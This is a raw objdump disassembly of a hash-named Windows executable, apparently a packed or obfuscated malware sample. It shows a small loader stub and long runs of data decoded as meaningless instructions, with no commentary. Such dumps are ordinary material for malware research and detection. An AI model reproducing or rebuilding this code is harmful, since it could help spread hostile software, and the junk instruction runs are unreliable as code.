
3c96d724f9157d9a98918c587540023e5992e153c4bec874566fc33de364b9e2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a795
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0x52d60cf7
  40101f:	push   esi
  401020:	and    eax,0x78787878
  401025:	(bad)  
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(0)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080a0e
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz mov esp,0x12e019a5
  4010d4:	push   0xffffffca
  4010d6:	xchg   esi,eax
  4010d7:	adc    dl,BYTE PTR [esi-0x5d536523]
  4010dd:	into   
  4010de:	in     al,0x97
  4010e0:	adc    BYTE PTR [eax],bl
  4010e2:	cmp    BYTE PTR [eax],0x62
  4010e5:	dec    eax
  4010e6:	mov    ch,0x96
  4010e8:	xchg   ebx,ebx
  4010ea:	mov    ecx,0xad8731be
  4010ef:	mov    dh,0xfc
  4010f1:	or     ebx,DWORD PTR [ebp+0x4606fedd]
  4010f7:	inc    eax
  4010f8:	jge    0x40108a
  4010fa:	jbe    0x4010a9
  4010fc:	out    dx,eax
  4010fd:	sub    BYTE PTR [edi],ch
  4010ff:	test   eax,0xa8cc9cdf
  401104:	ja     0x401154
  401106:	ins    BYTE PTR es:[edi],dx
  401107:	mov    esp,0x7e4219f8
  40110c:	(bad)  
  40110d:	mov    ch,0x70
  40110f:	lock shl BYTE PTR [ecx+0x47],1
  401113:	imul   esp,DWORD PTR [edi+0x5224c04d],0x35087cb9
  40111d:	mov    eax,0x676e5996
  401122:	gs xchg ebx,eax
  401124:	subps  xmm7,XMMWORD PTR [ecx-0x47]
  401128:	xor    eax,0xab9b0da4
  40112d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40112e:	or     DWORD PTR [esi-0x4e71c6de],ebx
  401134:	push   ecx
  401135:	int3   
  401136:	xchg   esp,eax
  401137:	xchg   BYTE PTR [ecx-0x41],bl
  40113a:	add    al,0x3c
  40113c:	fild   DWORD PTR [ebx-0x7646c401]
  401142:	adc    esi,DWORD PTR [edx]
  401144:	add    ch,cl
  401146:	fidivr WORD PTR [eax+esi*2]
  401149:	mov    al,ds:0xb59f18db
  40114e:	pop    esp
  40114f:	jb     0x401107
  401151:	enter  0x513e,0xb
  401155:	test   al,0x99
  401157:	outs   dx,BYTE PTR ds:[esi]
  401158:	xor    dl,BYTE PTR [edi]
  40115a:	mov    ch,0x14
  40115c:	jo     0x4010f7
  40115e:	pop    edx
  40115f:	fisubr DWORD PTR [ecx-0x2a]
  401162:	inc    ebx
  401163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401164:	lods   eax,DWORD PTR ds:[esi]
  401165:	leave  
  401166:	fadd   DWORD PTR ds:0x2fd7c2aa
  40116c:	(bad)  
  40116d:	lods   al,BYTE PTR ds:[esi]
  40116e:	push   0xffffffe1
  401170:	push   edx
  401171:	xor    eax,0x448d55a4
  401176:	inc    si
  401178:	sbb    eax,0x6dbebddc
  40117d:	jbe    0x4011a1
  40117f:	(bad)  
  401180:	jmp    DWORD PTR [eax-0x25]
  401183:	and    ah,BYTE PTR [ecx+0x9923b5a]
  401189:	xchg   ebx,eax
  40118a:	scas   eax,DWORD PTR es:[edi]
  40118b:	test   eax,0x1376f270
  401190:	inc    ebp
  401191:	adc    BYTE PTR [edx+0x1e],dl
  401194:	jge    0x401191
  401196:	xchg   edi,eax
  401197:	pop    es
  401198:	repnz test eax,0x69cd59c2
  40119e:	lods   al,BYTE PTR ds:[esi]
  40119f:	mov    eax,ds:0xf311259f
  4011a4:	ret    
  4011a5:	xor    al,0xad
  4011a7:	adc    eax,edi
  4011a9:	jge    0x401190
  4011ab:	(bad)  
  4011ad:	mov    eax,0x9d70cd60
  4011b2:	mov    esi,0xa3092ff9
  4011b7:	push   eax
  4011b8:	sub    DWORD PTR [esi-0x7627e17],eax
  4011be:	xchg   BYTE PTR [ebx],al
  4011c0:	jae    0x401229
  4011c2:	inc    ebp
  4011c3:	mov    al,ds:0x67f1c6dd
  4011c8:	dec    esi
  4011c9:	sbb    BYTE PTR [eax-0x3],0x7e
  4011cd:	cmp    al,0x8
  4011cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011d0:	loopne 0x4011c9
  4011d2:	add    eax,0x674a883a
  4011d7:	inc    ebp
  4011d8:	cld    
  4011d9:	jo     0x4011bc
  4011db:	push   0x5e
  4011dd:	enter  0xab1d,0xe3
  4011e1:	xor    ebp,DWORD PTR [ebp-0x4]
  4011e4:	dec    esp
  4011e5:	iret   
  4011e6:	mov    eax,ds:0x2a6035c4
  4011eb:	push   es
  4011ec:	in     al,0x8d
  4011ee:	fadd   st,st(2)
  4011f0:	mov    edi,0xc3ef820d
  4011f5:	sbb    BYTE PTR [ebp-0x2d],dh
  4011f8:	or     ecx,DWORD PTR [ebx-0x7acd912a]
  4011fe:	xlat   BYTE PTR ds:[ebx]
  4011ff:	push   ds
  401200:	jns    0x4011cf
  401202:	mov    edi,0xb3559ba0
  401207:	cmp    edi,DWORD PTR [ecx+0x7e]
  40120a:	sub    ebx,DWORD PTR [edi]
  40120c:	pop    ebp
  40120d:	mov    ds:0x3085e350,eax
  401212:	cmp    eax,0x2ec0b5d2
  401217:	aas    
  401218:	shr    BYTE PTR [ebp-0x2],0x86
  40121c:	cdq    
  40121d:	push   es
  40121e:	xchg   dl,bh
  401220:	rol    BYTE PTR [ebx],cl
  401222:	mov    edi,0xd8f75dc0
  401227:	sub    BYTE PTR [edx+0x7401ba63],ah
  40122d:	push   ss
  40122e:	inc    ecx
  40122f:	cmp    DWORD PTR [esi+0x2e111aab],esp
  401235:	pop    ebp
  401236:	hlt    
  401237:	ds loopne 0x401245
  40123a:	mov    al,ds:0xeb0d964c
  40123f:	retf   
  401240:	jo     0x401245
  401242:	jo     0x4012a3
  401244:	js     0x4011ce
  401246:	(bad)  
  401249:	je     0x40127e
  40124b:	inc    ebp
  40124c:	add    al,0x3e
  40124e:	push   0x6b8de506
  401253:	cmc    
  401254:	sub    ecx,DWORD PTR [ecx+0x5b]
  401257:	arpl   WORD PTR [ebx+0x70],sp
  40125a:	scas   eax,DWORD PTR es:[edi]
  40125b:	ja     0x4012ba
  40125d:	mov    eax,ds:0xe8f7d965
  401262:	push   ebx
  401263:	adc    DWORD PTR [esi],0x9f3a0937
  401269:	add    ecx,DWORD PTR [edx+0x35]
  40126c:	clc    
  40126d:	mov    al,ds:0x8e8a6207
  401272:	repnz rol esp,cl
  401275:	popa   
  401276:	jmp    0x401268
  401278:	dec    esi
  401279:	lock mov al,ds:0xe274a06b
  40127f:	call   0x7a6d:0x575c6347
  401286:	jb     0x4012cb
  401288:	add    eax,0xb35be954
  40128d:	cmp    BYTE PTR [ebx-0x56],ch
  401290:	add    al,0x66
  401292:	imul   esi,DWORD PTR [ecx+0x7],0x5d
  401296:	jge    0x401259
  401298:	cmp    DWORD PTR [edx+esi*8],edx
  40129b:	sbb    DWORD PTR [ebx-0x6ec5f59b],esi
  4012a1:	cld    
  4012a2:	outs   dx,BYTE PTR ds:[esi]
  4012a3:	or     DWORD PTR [edi+0x11],ecx
  4012a6:	mov    bl,0x8e
  4012a8:	bound  esp,QWORD PTR [edx]
  4012aa:	xor    ah,BYTE PTR [ecx+0x41eae6]
  4012b0:	xor    DWORD PTR ds:0x42a82d,edx
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42a7e1
  4012c2:	or     DWORD PTR ds:0x42a78d,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a77d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7e1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7d5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a859,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a859
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a859,ebx
  401312:	cmp    DWORD PTR ds:0x42a859,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a859,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a7a1,0x42a825
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a829,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a829
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a829,edi
  401361:	cmp    DWORD PTR ds:0x42a829,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a829,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a829,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a829
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a829,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7d5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a78d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a78d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a78d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7d5
  4013d7:	push   0x0
  4013d9:	push   0x42a9ed
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a78d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a78d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a78d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a78d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a78d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx-0x18],1
  401422:	inc    esi
  401423:	sub    al,0xd
  401425:	(bad)  
  401426:	jle    0x4014a0
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x4013b0
  40142e:	gs jge 0x401470
  401431:	cmp    DWORD PTR [esi],esi
  401433:	mov    cl,0x84
  401435:	lds    ebp,FWORD PTR [eax]
  401437:	mov    WORD PTR [edi+ebp*1+0x33],ds
  40143b:	sbb    al,0xd7
  40143d:	out    dx,eax
  40143e:	imul   edi,DWORD PTR [esi+0x50b3aa01],0x30
  401445:	mov    eax,0xcc4da1b7
  40144a:	sub    DWORD PTR [edx],edi
  40144c:	mov    al,0x86
  40144e:	(bad)  
  40144f:	lea    ebx,[esi]
  401451:	sbb    eax,0x82ddd6e3
  401456:	mov    ah,BYTE PTR [eax]
  401458:	jo     0x40149b
  40145a:	xor    eax,0xf7ab3a3c
  40145f:	push   ecx
  401460:	stos   BYTE PTR es:[edi],al
  401461:	sbb    dh,al
  401463:	popf   
  401464:	cs fwait
  401466:	or     BYTE PTR ds:0x60d88d5,cl
  40146c:	loopne 0x4014d6
  40146e:	iret   
  40146f:	xchg   ebx,eax
  401470:	sub    al,0x78
  401472:	arpl   WORD PTR [edx-0x307390d5],si
  401478:	or     al,0x8c
  40147a:	inc    esp
  40147b:	pop    edx
  40147c:	adc    eax,0x9e400b56
  401481:	xchg   edi,eax
  401482:	mov    cl,0xee
  401484:	fiadd  DWORD PTR [ebx+0x2e]
  401487:	jmp    0x4014b0
  401489:	add    DWORD PTR [edx-0x73],0xffffff95
  40148d:	adc    BYTE PTR [esi],0x36
  401490:	int    0xf5
  401492:	xchg   ecx,eax
  401493:	dec    edx
  401494:	cld    
  401495:	test   eax,0x7362a4e7
  40149a:	cwde   
  40149b:	push   eax
  40149c:	pop    edi
  40149d:	inc    edi
  40149e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40149f:	(bad)  
  4014a0:	and    dh,cl
  4014a2:	mul    BYTE PTR [edx+eax*1]
  4014a5:	adc    edi,DWORD PTR [ebx-0x7b540894]
  4014ab:	retf   
  4014ac:	icebp  
  4014ad:	imul   ebp,esp,0xf3e811b1
  4014b3:	xor    eax,0x39da6f80
  4014b8:	dec    esi
  4014b9:	dec    ebp
  4014ba:	fst    st(6)
  4014bc:	dec    esp
  4014be:	mov    dl,0x11
  4014c0:	mov    ds,WORD PTR [esi+0x2728eb2d]
  4014c6:	sub    eax,0x2c239f91
  4014cb:	mov    ebx,0xb391b130
  4014d0:	add    bl,BYTE PTR [ebp-0x60f8073]
  4014d6:	xchg   ebp,eax
  4014d7:	jno    0x401522
  4014d9:	(bad)  
  4014da:	sub    esi,DWORD PTR [esi]
  4014dc:	cmp    bl,BYTE PTR [ebp+0x5814f39e]
  4014e2:	adc    dh,bh
  4014e4:	aam    0xe0
  4014e6:	adc    ch,BYTE PTR [edx+eiz*8]
  4014e9:	xor    eax,0xe9e1b22e
  4014ee:	(bad)  
  4014ef:	pop    edx
  4014f0:	pop    ds
  4014f1:	xchg   ebx,eax
  4014f2:	sub    DWORD PTR [edx],edi
  4014f4:	jmp    0x119b372c
  4014f9:	not    BYTE PTR [esi-0x78504137]
  4014ff:	inc    edi
  401500:	shr    DWORD PTR [esp+ecx*4-0x34bb458d],1
  401507:	mov    WORD PTR [ebx],es
  401509:	(bad)  
  40150a:	shl    DWORD PTR [eax-0x57aeb84e],cl
  401510:	or     al,0xc8
  401512:	inc    ebp
  401513:	jmp    0x8c92:0xbb2817c5
  40151a:	loop   0x4014b2
  40151c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40151d:	pop    ebx
  40151e:	test   BYTE PTR ds:0x58fe9e95,0x71
  401525:	add    DWORD PTR [edi+0x1b],ebx
  401528:	out    0x9d,al
  40152a:	sahf   
  40152b:	cmc    
  40152c:	sub    bl,BYTE PTR [ebp+0x1e339dd]
  401532:	std    
  401533:	loop   0x401524
  401535:	imul   DWORD PTR [edx]
  401537:	mov    esi,ds
  401539:	and    ebx,DWORD PTR [ecx+0x7d]
  40153c:	loop   0x401552
  40153e:	retf   0x5b18
  401541:	inc    ecx
  401542:	sub    BYTE PTR [edi-0x73],cl
  401545:	sti    
  401546:	stos   DWORD PTR es:[edi],eax
  401547:	push   edi
  401548:	std    
  401549:	push   ebx
  40154a:	call   0xcb53:0x355e41ae
  401551:	daa    
  401552:	xchg   BYTE PTR [edi+0x2572211c],cl
  401558:	cmp    eax,0xbcbc41db
  40155d:	and    edi,DWORD PTR [ebp+ecx*1-0x59]
  401561:	dec    BYTE PTR [edi+0x6925e071]
  401567:	xor    al,BYTE PTR [esp+edi*1+0x3cb7556e]
  40156e:	inc    esi
  40156f:	dec    esi
  401570:	aaa    
  401571:	mov    ss,edi
  401573:	arpl   WORD PTR [ecx-0x67],dx
  401576:	repz mov ebx,0xc954b63b
  40157c:	or     DWORD PTR [ebx],eax
  40157e:	or     al,0xa5
  401580:	(bad)  
  401581:	mov    ebp,0x5835acfd
  401586:	push   ds
  401587:	add    eax,0xd9f96614
  40158c:	fwait
  40158d:	xchg   edi,eax
  40158e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40158f:	nop
  401590:	cmp    DWORD PTR [ebx+0x8],edi
  401593:	imul   esp,DWORD PTR [esi+0x20],0x85c73e69
  40159a:	aam    0x8a
  40159c:	jno    0x4015a0
  40159e:	fcomp  DWORD PTR [ebx+eiz*2-0x10]
  4015a2:	ds xchg edi,eax
  4015a4:	mov    cl,BYTE PTR [ecx-0x25]
  4015a7:	sbb    DWORD PTR [esi+0x38e63fd5],ebp
  4015ad:	xor    ebp,0xcfec3a1f
  4015b3:	or     BYTE PTR [ecx+0x6272caf8],dl
  4015b9:	sbb    BYTE PTR [edi+0x45],bl
  4015bc:	jecxz  0x40163c
  4015be:	aas    
  4015bf:	push   esp
  4015c0:	pop    ds
  4015c1:	or     DWORD PTR [eax+0x36],ebp
  4015c4:	(bad)  
  4015c5:	pop    eax
  4015c6:	pushf  
  4015c7:	test   eax,0x35f0d2a7
  4015cc:	mov    ebp,0xe8a5baf5
  4015d1:	nop
  4015d2:	clc    
  4015d3:	inc    eax
  4015d4:	xchg   ebp,eax
  4015d5:	push   ebx
  4015d6:	int    0xd1
  4015d8:	je     0x401640
  4015da:	cli    
  4015db:	mov    bh,0xcd
  4015dd:	stc    
  4015de:	fisttp DWORD PTR ds:0x2f88da
  4015e4:	fcom   DWORD PTR [eax]
  4015e6:	cdq    
  4015e7:	addr16 (bad) 
  4015e9:	loop   0x4015d1
  4015eb:	and    DWORD PTR [ebx+0x78657143],ebp
  4015f1:	in     al,0x2e
  4015f3:	or     bl,BYTE PTR [eax+0x4f4f2985]
  4015f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015fb:	pop    ecx
  4015fc:	fwait
  4015fd:	sbb    BYTE PTR [esi-0x20b81fbd],bl
  401603:	(bad)  
  401604:	sub    dh,BYTE PTR [edi-0x50]
  401607:	dec    edi
  401608:	ficom  WORD PTR [ecx-0x77478eb2]
  40160e:	sbb    al,0x40
  401610:	pop    ebp
  401611:	sub    al,0x7
  401613:	mov    edx,0x1f6558a5
  401618:	mov    bl,0x47
  40161a:	shl    BYTE PTR [edi-0x70],1
  40161d:	mov    esi,0x943c719f
  401622:	lods   al,BYTE PTR ds:[esi]
  401623:	imul   edi,esp,0xffffff85
  401626:	and    eax,0x2059a9f1
  40162b:	jno    0x401655
  40162d:	jnp    0x401630
  40162f:	mov    esp,0xa937f270
  401634:	aam    0x49
  401636:	push   0x9
  401638:	xchg   esp,eax
  401639:	mov    dl,0xdf
  40163b:	pop    ebx
  40163c:	add    ecx,DWORD PTR [esi]
  40163e:	rol    DWORD PTR [edi],1
  401640:	enter  0xd3f5,0xa8
  401644:	out    0x7b,eax
  401646:	aam    0x2e
  401648:	bound  ecx,QWORD PTR ds:0x4f1ad9a7
  40164e:	inc    ebx
  40164f:	mov    ch,0x8a
  401651:	sbb    DWORD PTR cs:[edi+edi*2],ebp
  401655:	es mov ch,0x75
  401658:	push   esi
  401659:	lods   eax,DWORD PTR ds:[esi]
  40165a:	jp     0x4015f0
  40165c:	retf   
  40165d:	dec    ebp
  40165e:	popf   
  40165f:	sbb    bh,BYTE PTR [edx-0x77]
  401662:	and    eax,0x4ce1e946
  401667:	(bad)  
  401669:	cmp    ch,BYTE PTR [ebp-0x557f157d]
  40166f:	test   DWORD PTR [ebp+0x69],esp
  401672:	nop
  401673:	lea    esp,[eax-0x11aed96]
  401679:	push   ebp
  40167a:	call   0xcb6a:0x4627a028
  401681:	(bad)  
  401682:	cmp    esi,DWORD PTR fs:[edi+0x883d2cd]
  401689:	adc    eax,0xe02cab32
  40168e:	adc    DWORD PTR [edx-0x10],ebx
  401691:	mov    ah,0xf1
  401693:	mov    BYTE PTR [edi+0x25],cl
  401696:	jo     0x4016e0
  401698:	aas    
  401699:	and    DWORD PTR [edx+0x2],esi
  40169c:	fcomp  QWORD PTR [ebp+0x69a643bd]
  4016a2:	xchg   BYTE PTR [edx],dl
  4016a4:	loopne 0x401689
  4016a6:	stos   DWORD PTR es:[edi],eax
  4016a7:	adc    DWORD PTR [edi-0x69],edi
  4016aa:	lods   al,BYTE PTR ds:[esi]
  4016ab:	and    BYTE PTR [ebp+eax*1-0x7e38fcdb],0x35
  4016b3:	ins    DWORD PTR es:[edi],dx
  4016b4:	test   al,0x42
  4016b6:	add    ah,bl
  4016b8:	push   ebx
  4016b9:	add    BYTE PTR [eax],al
  4016bb:	mov    DWORD PTR [ecx],eax
  4016bd:	adc    DWORD PTR ds:0x42a7d9,edi
  4016c3:	lea    eax,[ebp-0x4]
  4016c6:	or     DWORD PTR ds:0x42a789,0x42a77d
  4016d0:	mov    DWORD PTR [ebp-0x10],eax
  4016d3:	xor    DWORD PTR ds:0x42a78d,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz add DWORD PTR ds:0x37c2b49,ebp
  4016fa:	js     0x401774
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x401738
  401701:	enter  0x63f1,0x4a
  401705:	jmp    0x4016e5
  401707:	mov    al,ds:0x6e4ae917
  40170c:	rcl    BYTE PTR [edx],1
  40170e:	ror    BYTE PTR [esi-0x50],cl
  401711:	or     bl,cl
  401713:	dec    esi
  401714:	mov    cl,0xa2
  401716:	call   0x1bb5:0x2d1a13f4
  40171d:	adc    cl,0x4c
  401720:	arpl   WORD PTR [ecx-0x6767c5ff],bp
  401726:	add    BYTE PTR [edi],bl
  401728:	je     0x4016c0
  40172a:	(bad)  
  40172b:	dec    ebp
  40172c:	dec    eax
  40172d:	mov    edx,0x4d022825
  401732:	cmp    BYTE PTR [ebx-0x4276aa39],ah
  401738:	pop    ebx
  401739:	fwait
  40173a:	out    0x52,al
  40173c:	stos   DWORD PTR es:[edi],eax
  40173d:	pop    edi
  40173e:	ins    DWORD PTR es:[edi],dx
  40173f:	mov    bh,0x8b
  401741:	mov    edi,0xfc50b3bf
  401746:	ins    DWORD PTR es:[edi],dx
  401747:	jnp    0x401756
  401749:	and    ebp,esp
  40174b:	sbb    DWORD PTR [edi-0x9],eax
  40174e:	sub    ebp,DWORD PTR [ecx+0xd]
  401751:	sti    
  401752:	jno    0x4016fb
  401754:	fisttp WORD PTR [ebp+ebx*8+0x45cdc92d]
  40175b:	popa   
  40175c:	adc    DWORD PTR ds:0xbcaa0289,ebx
  401762:	sub    eax,0xa16578ce
  401767:	iret   
  401768:	cmp    DWORD PTR [edx],ebx
  40176a:	ss gs ret 0x7cb0
  40176f:	sbb    bl,dl
  401771:	dec    eax
  401772:	loop   0x4017cf
  401774:	test   BYTE PTR [edi-0x29],0x1a
  401778:	pop    esi
  401779:	retf   
  40177a:	push   cs
  40177b:	or     DWORD PTR [edi],edx
  40177d:	sar    DWORD PTR [edx],cl
  40177f:	bound  ecx,QWORD PTR [ebp-0x3bbb956e]
  401785:	in     eax,dx
  401786:	not    BYTE PTR [ecx-0x3525a5da]
  40178c:	pop    edx
  40178d:	sub    esp,DWORD PTR [ecx]
  40178f:	jl     0x401736
  401791:	xor    BYTE PTR [esi],0xcd
  401794:	mul    eax
  401796:	add    al,BYTE PTR [ecx]
  401798:	sbb    eax,0x43c3fadc
  40179d:	adc    ebx,DWORD PTR [edi-0x27aee78c]
  4017a3:	dec    esi
  4017a4:	je     0x4017d0
  4017a6:	iret   
  4017a7:	sbb    bl,BYTE PTR [ecx+0x7]
  4017aa:	sahf   
  4017ab:	cmp    al,0x25
  4017ad:	add    eax,0x69cc3cb8
  4017b2:	mov    ecx,DWORD PTR [esi+0x622592b9]
  4017b8:	mov    bl,0x52
  4017ba:	inc    esp
  4017bb:	or     DWORD PTR [ebx-0x55],ebx
  4017be:	test   DWORD PTR [esi+ecx*8+0x4c40afb1],esp
  4017c5:	arpl   WORD PTR gs:[edi+edi*4+0x70],ax
  4017ca:	sbb    eax,DWORD PTR [edx]
  4017cc:	add    dh,BYTE PTR [esi+0x6d5f2edf]
  4017d2:	rcl    DWORD PTR [edx+ebp*1+0x7fbfd874],cl
  4017d9:	fistp  WORD PTR [ecx+0x139c5ee8]
  4017df:	cmp    bl,BYTE PTR [ecx-0x77e1c45]
  4017e5:	mov    eax,ds:0xdda72743
  4017ea:	or     DWORD PTR [edi-0x146a9e92],esp
  4017f0:	xor    al,0x11
  4017f2:	add    BYTE PTR [esi-0xde3e555],dl
  4017f8:	int3   
  4017f9:	add    eax,0xfa396e6d
  4017fe:	(bad)  
  4017ff:	fidiv  WORD PTR [eax-0x268f836]
  401805:	ins    DWORD PTR es:[edi],dx
  401806:	rol    cl,0xfd
  401809:	pushf  
  40180a:	sbb    eax,0xf6da7a67
  40180f:	add    al,0x17
  401811:	cmp    DWORD PTR ds:[ebx+0x48f6045b],edi
  401818:	test   eax,0x6937b7ea
  40181d:	in     eax,0x78
  40181f:	std    
  401820:	sar    bh,1
  401822:	cmp    bl,BYTE PTR [esi]
  401824:	xchg   DWORD PTR [edx+eax*1-0x6811fe9b],ebx
  40182b:	mov    cl,0x42
  40182d:	cmp    eax,0x1678cb9b
  401832:	and    bh,BYTE PTR [ecx+eax*4+0x41faaab0]
  401839:	mov    esp,0xdafe1eb5
  40183e:	and    DWORD PTR [ebx+0x4a],0x353d5162
  401845:	mov    BYTE PTR ds:0x2a91f159,ah
  40184b:	imul   edx,DWORD PTR [esi+0x4b32d36d],0xd0a7f5cc
  401855:	int    0xba
  401857:	mov    cl,BYTE PTR [ebp+0x7c92d75f]
  40185d:	adc    al,0x3b
  40185f:	mov    ds:0xd3cf4f1e,al
  401864:	aaa    
  401865:	sbb    eax,0x8b067531
  40186a:	sbb    bh,BYTE PTR [edx-0x9186baa]
  401870:	(bad)  
  401871:	jno    0x401801
  401873:	xor    DWORD PTR [edx-0x618d8d7e],ebp
  401879:	aam    0xd4
  40187b:	cmp    edi,ecx
  40187d:	sub    bl,BYTE PTR [esi]
  40187f:	jno    0x4018f4
  401881:	dec    edx
  401882:	jb     0x40182a
  401884:	mov    dl,0x91
  401886:	nop
  401887:	fisub  DWORD PTR [ebp-0x5094e8f3]
  40188d:	jmp    0x9896:0x24fa7181
  401894:	jns    0x401860
  401896:	xchg   ebp,eax
  401897:	sbb    al,0x65
  401899:	add    esp,DWORD PTR [edx]
  40189b:	leave  
  40189c:	cld    
  40189d:	xchg   ecx,eax
  40189e:	pop    ebx
  40189f:	xor    DWORD PTR [edx-0x4e8851ff],ebx
  4018a5:	adc    ah,BYTE PTR [ecx]
  4018a7:	popa   
  4018a8:	or     BYTE PTR [esi+0x6e],al
  4018ab:	aaa    
  4018ac:	or     cl,bh
  4018ae:	dec    ebp
  4018af:	sub    BYTE PTR [edi-0x7c],0xc2
  4018b3:	adc    esp,DWORD PTR [edx]
  4018b5:	aas    
  4018b6:	or     eax,0x696dfc21
  4018bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018bc:	aaa    
  4018bd:	inc    ecx
  4018bf:	mov    ch,BYTE PTR [edx]
  4018c1:	neg    BYTE PTR [edi-0x61]
